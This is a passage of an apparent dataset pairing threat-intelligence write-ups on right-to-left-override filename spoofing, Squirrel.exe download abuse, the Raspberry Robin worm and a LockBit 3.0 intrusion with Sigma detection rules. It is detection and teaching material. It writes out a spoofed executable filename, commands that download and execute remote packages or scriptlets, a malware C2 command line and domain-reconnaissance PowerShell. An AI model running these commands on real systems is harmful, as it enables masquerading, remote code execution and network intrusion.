\\u202E BAM! everything is reversed.\"\n  This is all going left to right and then .desrever si gnihtyrevE !BAM\n```\n\nThat’s cool. As soon as your terminal, browser, or operating system sees that Right-to-Left Override character, it renders every character afterward as right to left. The characters are still stored in the order they were typed — it is only the presentation that is reversed.\n\nThere’s a great xkcd showing how this works in real life:\n\n## How Attackers Use Right-to-Left Overrides\n\nCrafty attackers have been using Unicode characters to trick users into opening malicious files for years. These attacks most often try to trick the user into opening a file that they wouldn’t otherwise. The trick is to make the file look like a PDF or Office document when in reality it is a piece of malware.\n\nLet’s say we have a piece of malware we want Bobby to open, and it is named with the “scr” extension, a Windows Portable Executable (“PE”) associated with Windows screensaver files.\n\nAs the attacker, we can name our file:\n\n```\n\"charity_fundraiser_bb\\u202Excod.scr\"\n```\n\nBecause of the Right-to-Left character, Bobby’s email client and operating system are going to display that as:\n\n```image\nAlt: filename_rtl_example\nDescription: The image displays a filename formatted to deceive users into believing it is a benign document. The filename appears as 'charity_fundraiser_bb rcs.docx', which looks like a standard DOCX file. However, the presence of Right-to-Left Override Unicode characters is implied, which alters how the filename is displayed, tricking users into opening a malicious file that is actually an executable with a '.scr' extension.\nTranscription: |\n  charity_fundraiser_bb‍rcs.docx\n```\n\nNow Bobby is much more likely to open that file because it looks like a nice, safe, DOCX file.\n\n## Using EDR Data to Detect Potential Threats\n\nTo detect these potential attacks, look for any filenames that include the Right-to-Left characters. In many tools it isn’t possible to directly search for specific Unicode characters using the escape sequence (i.e., `\\u202E`) so you may need to copy that character, which will look invisible, and paste it into the tool’s search panel. You can tell your paste was successful if you type characters following your text and they appear right to left.\n\nTo further extend this, also look for the Left-to-Right character (U+202D) that might be used to further obfuscate the true filename.\n\nThe accuracy of this detector will be partially based on how global of a workforce you are monitoring. If your users commonly use right-to-left languages, you will see these matches more often. In that case, you can add further detection criteria to limit matches by additional context such as filename extension, file type (is it an executable/binary PE, ELF, etc.), etc.\n\n> At Red Canary, we’ve seen roughly 300 hits of this detector over the past 90 days across hundreds of thousands of endpoints. This is a reasonably accurate detector without a high workload impact or false positive rate to your team.\n\n## Responding to Potential Threats\n\nTriaging and investigating these hits can be challenging because your EDR platform’s web console is going to kindly read the Right-to-Left character and display it to you as the attacker intended.\n\nIt takes a careful eye to identify the whitespace indicative of the Right-to-Left character in many browsers. The below screenshot shows an example of Carbon Black Response in Chrome.\n\nAfter triaging many of these filenames, our Security Operations team is working on ways to flag these special characters in the Red Canary platform so they stand out clearly for our analysts. For the devout DFIR analyst, a Chrome plugin that flags these characters on the page would be a useful feature.",
    "sigma_rule": {
      "title": "Potential Defense Evasion Via Right-to-Left Override",
      "id": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
      "related": [
        {
          "id": "e0552b19-5a83-4222-b141-b36184bb8d79",
          "type": "derived"
        },
        {
          "id": "584bca0f-3608-4402-80fd-4075ff6072e3",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n",
      "references": [
        "https://redcanary.com/blog/right-to-left-override/",
        "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method",
        "https://unicode-explorer.com/c/202E"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "‮"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Commandlines that contains scriptures such as arabic or hebrew might make use of this character"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_right_to_left_override.yml"
  },
  "3": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
    "markdown": "# /Squirrel.exe\n\nBinary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.\n\n### Paths:\n- `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe`\n\n### Resources:\n- https://www.youtube.com/watch?v=rOP3hnkj7ls\n- https://twitter.com/reegun21/status/1144182772623269889\n- http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/\n- https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12\n- https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56\n\n### Detections:\n- Sigma: proc_creation_win_lolbin_squirrel.yml\n\n## Download\nThe above binary will go to url and look for RELEASES file and download the nuget package.\n\n```\nsquirrel.exe --download [url to package]\n```\n\n**Use case:** Download binary\n**Privileges required:** User\n**Operating systems:** Windows 7 and up with Microsoft Teams installed\n**ATT&CK® technique:** T1218: System Binary Proxy Execution\n\n## AWL bypass\nThe above binary will go to url and look for RELEASES file, download and install the nuget package.\n\n```\nsquirrel.exe --update [url to package]\n```\n\n**Use case:** Download and execute binary\n**Privileges required:** User\n**Operating systems:** Windows 7 and up with Microsoft Teams installed\n**ATT&CK® technique:** T1218: System Binary Proxy Execution\n\nThe above binary will go to url and look for RELEASES file, download and install the nuget package.\n\n```\nsquirrel.exe --updateRollback=[url to package]\n```\n\n**Use case:** Download and execute binary\n**Privileges required:** User\n**Operating systems:** Windows 7 and up with Microsoft Teams installed\n**ATT&CK® technique:** T1218: System Binary Proxy Execution\n\n## Execute\nThe above binary will go to url and look for RELEASES file, download and install the nuget package.\n\n```\nsquirrel.exe --update [url to package]\n```\n\n**Use case:** Download and execute binary\n**Privileges required:** User\n**Operating systems:** Windows 7 and up with Microsoft Teams installed\n**ATT&CK® technique:** T1218: System Binary Proxy Execution\n\nThe above binary will go to url and look for RELEASES file, download and install the nuget package.\n\n```\nsquirrel.exe --updateRollback=[url to package]\n```\n\n**Use case:** Download and execute binary\n**Privileges required:** User\n**Operating systems:** Windows 7 and up with Microsoft Teams installed\n**ATT&CK® technique:** T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "Arbitrary File Download Via Squirrel.EXE",
      "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
      "related": [
        {
          "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_download_cli": {
          "CommandLine|contains": [
            " --download ",
            " --update ",
            " --updateRollback="
          ]
        },
        "selection_download_http_keyword": {
          "CommandLine|contains": "http"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_download.yml"
  },
  "4": {
    "url": "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
    "markdown": "# Raspberry Robin gets the worm early\n\nRed Canary is tracking a worm spread by external drives that leverages Windows Installer to reach out to QNAP-associated domains and download a malicious DLL.\n\n*Originally published May 5, 2022. Last modified October 2, 2024.*\n\n---\n\nSince fall 2021, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Raspberry Robin was the seventh most prevalent threat we observed in 2022, as reported in our 2023 Threat Detection Report.\n\nRead on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how we decided to cluster this activity. Check out this video update for the latest developments and guidance on how to test your detection capabilities with Atomic Red Team.\n\n## Overview\n\n“Raspberry Robin” is Red Canary’s name for a cluster of activity we first observed in September 2021 involving a worm that is often installed via USB drive. This activity cluster relies on `msiexec.exe` to call out to its infrastructure, often compromised QNAP devices, using HTTP requests that contain a victim’s user and device names. We also observed Raspberry Robin use TOR exit nodes as additional command and control (C2) infrastructure.\n\nLike most activity clusters we track, Raspberry Robin began as a handful of detections with similar characteristics that we saw in multiple customers’ environments, first noticed by Jason Killam from Red Canary’s Detection Engineering team. We saw Raspberry Robin activity as far back as September 2021, though most related activity occurred during or after January 2022. As we observed additional activity, we couldn’t find public reporting to corroborate our analysis, aside from some findings on VirusTotal that we suspected were related based on overlap in C2 domains.\n\nTo date, we’ve observed Raspberry Robin in organizations with ties to technology and manufacturing, though it’s not yet clear if there are other links among victims. We have several intelligence gaps around this cluster, including the operators’ objectives. While we don’t yet have the full picture, we want to share what we know about this activity cluster so far to enrich collective understanding of this threat and empower defenders to identify this activity. We use the cluster name “Raspberry Robin” to refer to the entire chain of activity described below, including the initial access method, the worm itself, and the follow-on execution and C2 activity.\n\nBelow we’ve provided a comprehensive analysis of known Raspberry Robin behavior with corresponding detection opportunities along the way.\n\n```image\nAlt: Raspberry Robin Intrusion Chain\nDescription: The image is a diagram outlining the typical intrusion chain of the Raspberry Robin malware. It begins with the attachment of an infected USB drive, followed by the execution of malicious commands via cmd.exe and msiexec.exe. The chain details how these executables read and execute malicious files, download a malicious DLL, and misuse legitimate Windows utilities like rundll32.exe to execute this DLL. The diagram also indicates ongoing command and control activity, showing a sequence of actions that lead to persistent malicious behavior.\nTranscription: |\n  | Infected USB drive attached                                                              | cmd.exe and msiexec.exe                                                                              | Malicious DLL download                                                                          | rundll32.exe and Windows utility misuse                                                          | Ongoing command & control activity                                                                                  |\n  | ---------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------- |\n  | Raspberry Robin is typically introduced by infected removable drives such as USB devices | cmd.exe reads and executes a malicious file stored on the infected device, then launches msiexec.exe | If the external msiexec.exe connection is successful, it downloads and installs a malicious DLL | rundll32.exe launches a legitimate Windows utility like odbconf.exe to execute the malicious DLL | regsvr32.exe, rundll32.exe, and dllhost.exe repeatedly attempt outbound network connections, typically to TOR nodes |\n```\n\n*Figure 1: Raspberry Robin event outline*\n\n## Initial Access\n\nRaspberry Robin is typically introduced via infected removable drives, often USB devices. The Raspberry Robin worm often appears as a shortcut `.lnk` file masquerading as a legitimate folder on the infected USB device.\n\nSoon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry entry is updated and records execution of a ROT13-ciphered value referencing a `.lnk` file when deciphered. In the example below, `q:\\erpbirel.yax` deciphers to `d:\\recovery.lnk`.\n\n```image\nAlt: Registry modification with ROT13 .lnk file\nDescription: The image presents a detailed log entry related to the execution of a process on a Windows system. It shows a timestamp, the process that was spawned (`c:\\windows\\explorer.exe`), and a registry modification indicating that a write operation was performed on the UserAssist registry key. The log captures the path to the modified registry entry, which corresponds to a ROT13-deciphered `.lnk` file, illustrating the activity associated with the Raspberry Robin worm's infection process.\nTranscription: |\n  Process spawned\n  c:\\windows\\explorer.exe 47ea9e07b7dbfeb368bd95a3a2d25b\n  \n  2022-02-20 14:43:14.525 GMT regmod\n  First wrote to \\registry\\user\\s-1-5-21-432587278-321508835-1117227555-53619\\software\\microsoft\\windows\\currentversion\\explorer\\userassist\\{f4c57c4b-2046-46f0-a9eb-443bcko33d9f}\\count\\q:\\erpbirel.yax\n```\n\n*Figure 2: Registry modification with ROT13 `.lnk` file*\n\n## Execution\n\nRaspberry Robin first uses `cmd.exe` to read and execute a file stored on the infected external drive. The command is consistent across Raspberry Robin detections we have seen so far, making it reliable early evidence of potential Raspberry Robin activity. Typically the command line includes `cmd /R <` to read and execute a file. The filename pattern is unique, made up of five to seven random alphanumeric characters and a variety of file extensions such as `.usb`, `.ico`, `.lnk`, `.bin`, `.sv`, and `.lo`.\n\nHere’s an example of what the whole command might look like:\n\n```image\nAlt: Raspberry Robin cmd.exe command\nDescription: The image displays a command line execution output from a Windows operating system where the process `cmd.exe` is spawned. It shows the full path of the command being executed: `C:\\Windows\\System32\\cmd.exe`, along with a command line that includes a specific syntax: `\"cmd.exe\" /r C:\\WINDOWS\\system32\\cmd.exe<xjHfK.Usb`. The command is indicative of the Raspberry Robin malware activity described in the context, utilizing a mixed-case approach and involving execution from an external drive.\nTranscription: |\n  Process spawned\n  C:\\Windows\\System32\\cmd.exe 8a21228162dbeff04694b9c3e0b6cdee\n  \n  Command Line: \"cmd.exe\" /r C:\\WINDOWS\\system32\\cmd.exe<xjHfK.Usb\n```\n\n*Figure 3: Raspberry Robin `cmd.exe` command*\n\nNext, `cmd.exe` typically launches `explorer.exe` and `msiexec.exe`. With Raspberry Robin, `explorer.exe`’s command line can be a mixed-case reference to an external device or a person’s name, like `LAUREN V`, or the name of the `.lnk` file, like the figure below. The name here has been modified from the `.lnk` file name to `LNkFILe`.\n\n```image\nAlt: Mixed-case command referring to device or name\nDescription: The image displays a command line output showing a process spawned by `cmd.exe`. The command indicates the execution of `explorer.exe` from the `C:\\windows\\` directory, followed by a unique identifier likely representing the process or file. Below this, there is a highlighted command line example that demonstrates the mixed-case usage of `ExplOReR` referencing a `USB Drive`. This image provides insight into the behavior of the Raspberry Robin malware, specifically the use of mixed-case commands to evade detection.\nTranscription: |\n  Process spawned by cmd.exe\n  c:\\windows\\explorer.exe 744f2d2e4af2c1c64643fdbc60a21b27\n  \n  Command Line: ExpLoER \"USB Drive\"\n```\n\n```image\nAlt: Mixed-case command referring to device or name\nDescription: The image displays a command line output related to the Raspberry Robin malware. It shows a process spawned by `cmd.exe` that executes `explorer.exe` from the `C:\\\nTranscription: |\n  Process spawned by cmd.exe\n  c:\\windows\\explorer.exe 47ea9e07b7dbfeba368bd95a3a2d25b\n  \n  Command Line: eXPLOReR LNkFILe\n```\n\n*Figure 4: Mixed-case command referring to device or name*\n\nRaspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use mixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written to detect `evil` may not fire on `eViL`, but `cmd.exe` is case-insensitive and has the flexibility to read and process both commands the same way.\n\n## Command and Control (C2)\n\nLet’s look at Raspberry Robin’s `msiexec.exe` command in detail, since that informs our first behavior-based detection opportunity.\n\nWhile `msiexec.exe` downloads and executes legitimate installer packages, adversaries also leverage it to deliver malware. Raspberry Robin uses `msiexec.exe` to attempt external network communication to a malicious domain for C2 purposes. The command line has several key features we have seen across multiple detections:\n\n- Use of mixed-case syntax\n- Use of short, recently-registered domains only containing a few characters, for example `v0[.]cx`\n- The domains in our detections hosted QNAP NAS device login pages around the time of the Raspberry Robin activity. We hypothesize Raspberry Robin may use compromised QNAP devices for C2 infrastructure.\n- Inclusion of port `8080`, a non-standard HTTP web service port, in the URL\n- Inclusion of a string of random alphanumeric characters as the URL subdirectory, frequently followed by the victim’s hostname and username\n\nHere is a modified example of a full malicious Raspberry Robin `msiexec.exe` command line matching all of the above criteria:\n\n```image\nAlt: Malicious Raspberry Robin msiexec.exe command\nDescription: The image displays a command line output generated by the `msiexec.exe` process in a Windows system. It shows that the process was spawned by `cmd.exe` and includes a specific command line invocation. The command line demonstrates the use of mixed-case syntax, an HTTP URL pointing to a port (8080), and a string of random alphanumeric characters, which aligns with the characteristics of the malicious activity discussed in the context of the Raspberry Robin threat. This output serves as an example of how adversaries may misuse `msiexec.exe` for command and control (C2) purposes.\nTranscription: |\n  Process spawned by cmd.exe\n  C:\\Windows\\System32\\msiexec.exe e5da170027542e25ede42fc54c929077\n  \n  Command Line: MSiexEc /q-I \"htTP://MwGQ.nEt:8080/l5cnhZV6KA/HOSTNAME\"\n```\n\n*Figure 5: Malicious Raspberry Robin `msiexec.exe` command*\n\nTo detect suspicious use of `msiexec.exe` by Raspberry Robin or other threats, it’s essential to take a look at the command line and the URL. Detecting `msiexec.exe` making outbound network connections to download and install packages in the command line interface will give you the opportunity to examine the activity and determine if it’s malicious or not.\n\n---\n\n### Detection opportunity: `msiexec.exe` downloading and executing packages\n\nIdentify the use of Windows Installer Tool `msiexec.exe` to download and execute packages in the CLI.\n\n```\nprocess == ('msiexec')\n&&\nprocess_command_line_includes == ('http:', 'https:')\n&&\nprocess_command_line_includes == ('/q', '-q')\n```\n\n---\n\n## Persistence\n\nIn several Raspberry Robin detections, we have seen `msiexec.exe` go on to install a malicious DLL file. At this time we are not certain what the DLL does. We suspect it may establish persistence on the victim’s system. In the detections we saw, the malicious files were created as `C:\\Windows\\Installer\\MSI****.tmp` files. In one case, a file with the same hash was also created as `C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku`.\n\nExamples:\n\n- `C:\\Windows\\Installer\\MSI5C01.tmp`\n  `C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku`\n  - Shared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828\n  - VirusTotal example\n\n- `C:\\Windows\\Installer\\MSIE160.tmp`\n  - MD5 hash: e8f0d33109448f877a0e532b1a27131a\n  - VirusTotal example\n\n## Execution (again)\n\nNext, `msiexec.exe` launches a legitimate Windows utility, `fodhelper.exe`, which in turn spawns `rundll32.exe` to execute a malicious command. Processes launched by `fodhelper.exe` run with elevated administrative privileges without requiring a User Account Control prompt. It is unusual for `fodhelper.exe` to spawn any processes as the parent, making this another useful detection opportunity.\n\n---\n\n### Detection opportunity: `fodhelper.exe` as a parent process\n\nIdentify Windows Features On Demand helper `fodhelper.exe` creating processes as the parent.\n\n```\nparent_process == ('fodhelper')\n```\n\n---\n\nThe `rundll32.exe` command starts another legitimate Windows utility, in this case `odbcconf.exe`, and passes in additional commands to execute and configure the recently-installed malicious DLL `bznwi.ku` (Hash: 6f5ea8383bc3bd07668a7d24fe9b0828). Here is what that command looks like:\n\n```image\nAlt: Malicious rundll32.exe command\nDescription: The image displays a command line output related to the execution of `rundll32.exe`. It shows that a process has been spawned from `C:\\Windows\\System32\\rundll32.exe` with a specific command line that executes the `odbcconf.exe` utility. The command includes various flags and parameters, indicating actions such as configuring a driver and manipulating registry settings for a malicious DLL named `bznwi.ku`. This image serves to illustrate a specific technical detail relevant to the context of detecting malicious activity involving Windows processes.\nTranscription: |\n  Process spawned\n  C:\\Windows\\System32\\rundll32.exe ef3179d498793bf4234f708d3be28633\n  \n  Command Line: \"RUNDLL32.exe\" shell32,ShellExec_RunDLL \"C:\\WINDOWS\\syswow64\\odbcconf.exe\" -A {regsvr} \"C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku.\"} -E -A {configdriver VKIPDSE} -A {SETFILEDSNDIR fnpawxs PXQAND ofeslkscqqczuaj} -a {INSTALLDRIVER fqcmypo OGEYSCKXFTBNXAF}\n```\n\n*Figure 6: Malicious `rundll32.exe` command*\n\nThe `-A` flag in `odbcconf.exe` specifies an action. `configdriver` loads the driver setup DLL, in this case `VKIPDSE`. `SETFILEDSNDIR` creates the registry location `HKEY_LOCAL_MACHINE\\SOFTWARE\\ODBC\\ODBC.INI\\ODBC File DSN\\DefaultDSNDir`, if it does not already exist, and specifies the default location used by the ODBC Data Source Administrator when creating a file-based data source. `INSTALLDRIVER` adds additional information about the driver.\n\nIn this detection, we saw `odbcconf.exe` successfully execute the malicious command. Since `odbcconf.exe` has a built-in `regsvr` flag similar to `regsvr32.exe`, it can be used by adversaries to execute DLLs and bypass application control defenses that aren’t monitoring for `odbcconf.exe` misuse.\n\n---\n\n### Detection opportunity: `odbcconf.exe` loading .DLLs\n\nDetect the Windows Open Database Connectivity utility loading a configuration file or DLL. The `/A` flag specifies an action, `/F` uses a response file, and `/S` runs in silent mode. `Odbcconf.exe` running rgsvr actions in silent mode could indicate misuse.\n\n```\nprocess == ('odbcconf')\n&&\nprocess_command_line_includes == ('regsvr')\n&&\nprocess_command_line_includes == ('/f', '-f')\n||\nprocess_command_line_includes == ('/a', '-a')\n||\nprocess_command_line_includes == ('/s', '-s')\n```\n\n---\n\n## C2, part deux\n\nWe observed outbound C2 activity involving the processes `regsvr32.exe`, `rundll32.exe`, and `dllhost.exe` executing without any command-line parameters and making external network connections to IP addresses associated with TOR nodes. Additionally, some of the IP addresses in the connections host domains consisting of random alphanumeric characters. For example, `hxxps[:]//www[.]ivuoq6si2a[.]com/`.\n\nThis activity presents us with a final detection opportunity. It is atypical for `regsvr32.exe`, `rundll32.exe`, and `dllhost.exe` to execute with no command-line parameters and establish external network connections. This behavior is not inherently malicious, but is good to monitor.\n\n---\n\n### Detection opportunity: network connections from the command line with no parameters\n\nDetect `regsvr32.exe`, `rundll32.exe`, and `dllhost.exe` making external network connections with an empty command line.\n\n```\nprocess == ('regsvr32')\n||\nprocess == ('rundll32')\n||\nprocess == ('dllhost')\n&&\nprocess_command_line_contains == (“”)\n&&\nhas_netconnection\n```\n\n*Note: Double Quotes (“”) within the command line means null.*\n\n---\n\n## Testing\n\n*Editor’s note: We added the testing section to this article on May 11, 2022 and updated it on August 2, 2022.*\n\nThe detection opportunities listed in this article should offer good coverage against some Raspberry Robin-related techniques. However, it’s hard to know if a detection analytic is configured or implemented correctly without testing it. Luckily, we’ve got a few different Atomic Red Team tests that should effectively emulate the pseudo-detection analytics listed above.\n*Note: Atomic Red Team is an open source library of tests that security professionals can use to validate their security controls.*\n\n### Emulating Command Prompt reading and executing the contents of a CMD file\n\nThis atomic was developed specifically to emulate Raspberry Robin. It uses the “standard-in” command prompt feature (`cmd /R <`) to read and execute a file via cmd.exe. Run the following in the Command Prompt:\n\n```\ncmd /r cmd<C:\\AtomicRedTeam\\atomics\\T1059.003\\src\\t1059.003_cmd.cmd\n```\n\nYou can find the test file in the atomics library here.\n\n### Emulating `msiexec.exe` downloading and executing packages\n\nThis following atomic retrieves an arbitrary MSI file from a remote IP address and executes it. Note that the process is `msiexec.exe` and that the command line includes `/q` and `https:`—all of the variables mentioned in the above detection opportunity. Run the following in the Command Prompt:\n\n```\nmsiexec.exe /q /i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/T1218.007_JScript.msi\"\n```\n\nYou can find the test file in the atomics library here.\n\n### Emulating `odbcconf.exe` loading DLLs\n\nThe following atomic uses `odbcconf.exe` to load and execute a locally stored DLL. Note that the process will be `odbcconf.exe` and that the command line includes the `/a` and `/s` parameters that the pseudo detection analytic looks for.\n\n```\nodbcconf.exe /S /A {REGSVR \"C\\AtomicRedTeam\\atomics\\T1218.008\\src\\Win32\\T1218-2.dll\"}\n```\n\nNote that this test includes a prerequisite. You can find detailed instructions in the T1218.008 atomics folder.\n\n### Emulating network connections from the command line with no parameters\n\nThe following isn’t a perfect atomic for emulating this detection opportunity, but it’ll emulate the `rundll32.exe` process start and the network connection (albeit with a corresponding command line). Run the following in the Command Prompt.\n\n```\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();\n```\n\nYou can find the test file in the atomics library here.\n\n---\n\n## Intelligence gaps\n\nSeveral unanswered questions about this cluster remain. First and foremost, we don’t know how or where Raspberry Robin infects external drives to perpetuate its activity, though it’s likely this occurs offline or otherwise outside of our visibility. We also don’t know why Raspberry Robin installs a malicious DLL. One hypothesis is that it may be an attempt to establish persistence on an infected system, though additional information is required to build confidence in that hypothesis.\n\nPerhaps our biggest question concerns the operators’ objectives. Absent additional information on later-stage activity, it’s difficult to make inferences on the goal or goals of these campaigns. Despite this, we hope this information is useful for informing broader efforts to track and better detect Raspberry Robin activity. We hope to start a conversation that will help the whole community learn more about this threat. If you’ve been tracking similar activity, we’d love to hear from you and collaborate. Contact intel@redcanary.com with any observations or questions.\n\n## Appendix\n\nAs we define parameters for an activity cluster, we map behaviors to MITRE ATT&CK where applicable and note observables of interest. In some cases, often with infrastructure and certain adversary decisions, observables associated with an activity cluster may not neatly map to an ATT&CK technique, and that’s okay.\n\n| Tactic              | Technique                                         | Description                                                                     | Observable                                                                                                    |\n| ------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |\n| **Initial Access**  | T1091 Replication Through Removable Media         | Raspberry Robin was introduced via infected removable drives.                   | e:\\removable disk.lnk                                                                                         |\n| **Initial Access**  |                                                   | `explorer.exe` with a command line containing a reference to a device or name   | ExpLoRER “USB Drive” or EXPLorEr “LAUREN V”                                                                   |\n| **Execution**       | T1059.003 Command and Scripting Interpreter       | Raspberry Robin uses `cmd/R <` to read and execute a file.                      | C:\\Windows\\system32\\cmd.exe” /R CMD<lAkTp.mY0                                                                 |\n| **Defense Evasion** |                                                   | The use of mixed-case letters to evade defenses.                                | mSIeXEc, ExpLoRER, or HTtp in a command line                                                                  |\n| **Defense Evasion** | T1218.008 Signed Binary Proxy Execution           | Raspberry Robin uses `fodhelper.exe` and `odbcconf.exe` to proxy DLL execution. | RUNDLL32.exe shell32,ShellExec_RunDLLA ...                                                                    |\n| **C2**              | T1218.007 Signed Binary Proxy Execution: Msiexec  | `Msiexec.exe` making external network connections to URLs with victim info.     | msiEXEC /Q -I hXxp://3h[.]WF:8080/ZgMaAJK3xTC/LP079LLP=52284                                                  |\n| **C2**              |                                                   | Recently registered top-level domains used as C2 infrastructure.                | 3h[.]WF or v0[.]cx                                                                                            |\n| **C2**              | T1218.008 Signed Binary Proxy Execution: Rundll32 | `rundll32.exe` and `regsvr32.exe` used for C2 communication.                    | Look for `rundll32.exe` or `regsvr32.exe` making external network connections with no command-line arguments. |",
    "sigma_rule": {
      "title": "Rundll32 Spawned Via Explorer.EXE",
      "id": "1723e720-616d-4ddc-ab02-f7e3685a4713",
      "status": "test",
      "description": "Detects execution of \"rundll32.exe\" with a parent process of Explorer.exe. This has been observed by variants of Raspberry Robin, as first reported by Red Canary.",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "CD_ROM_",
      "date": "2022-05-21",
      "modified": "2023-08-31",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\explorer.exe"
        },
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          }
        ],
        "filter_main_generic": [
          {
            "CommandLine|contains": " C:\\Windows\\System32\\"
          },
          {
            "CommandLine|endswith": " -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617"
          }
        ],
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_parent_explorer.yml"
  },
  "5": {
    "url": "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/",
    "markdown": "# Back in Black: Unlocking a LockBit 3.0 Ransomware Attack\n\n**19 August 2022**\n**By RIFT: Research and Intelligence Fusion Team**\n\n---\n\n## Summary\n\n### tl;dr\n\nThis post explores some of the TTPs employed by a threat actor who were observed deploying LockBit 3.0 ransomware during an incident response engagement.\n\nBelow provides a summary of findings which are presented in this blog post:\n\n- Initial access via SocGholish.\n- Establishing persistence to run Cobalt Strike beacon.\n- Disabling of Windows Defender and Sophos.\n- Use of information gathering tools such as Bloodhound and Seatbelt.\n- Lateral movement leveraging RDP and Cobalt Strike.\n- Use of 7zip to collect data for exfiltration.\n- Cobalt Strike use for Command and Control.\n- Exfiltration of data to Mega.\n- Use of PsExec to push out ransomware.\n\n---\n\n## LockBit 3.0\n\nLockBit 3.0 aka “LockBit Black”, noted in June of this year has coincided with a large increase of victims being published to the LockBit leak site, indicating that the past few months has heralded a period of intense activity for the LockBit collective.\n\nIn the wake of the apparent implosion of previous prolific ransomware group CONTI [1], it seems that the LockBit operators are looking to fill the void; presenting a continued risk of encryption and data exfiltration to organizations around the world.\n\n---\n\n## TTPs\n\n### Initial Access\n\nInitial access into the network was gained via a download of a malware-laced zip file containing SocGholish. Once executed, the download of a Cobalt Strike beacon was initiated which was created in the folder `C:ProgramDataVGAuthService` with the filename `VGAuthService.dll`. Along with this, the Windows command-line utility `rundll32.exe` is copied to the folder and renamed to `VGAuthService.exe` and used to execute the Cobalt Strike DLL.\n\nPowerShell commands were also executed by the SocGholish malware to gather system and domain information:\n\n- `powershell /c nltest /dclist: ; nltest /domain_trusts ; cmdkey /list ; net group 'Domain Admins' /domain ; net group 'Enterprise Admins' /domain ; net localgroup Administrators /domain ; net localgroup Administrators ;`\n- `powershell /c Get-WmiObject win32_service -ComputerName localhost | Where-Object {$_.PathName -notmatch 'c:win'} | select Name, DisplayName, State, PathName | findstr 'Running'`\n\n### Persistence\n\nA persistence mechanism was installed by SocGholish using the startup folder of the infected user to ensure execution at user logon. The shortcut file `C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start MenuProgramsStartupVGAuthService.lnk` was created and configured to execute the following command which will run the Cobalt 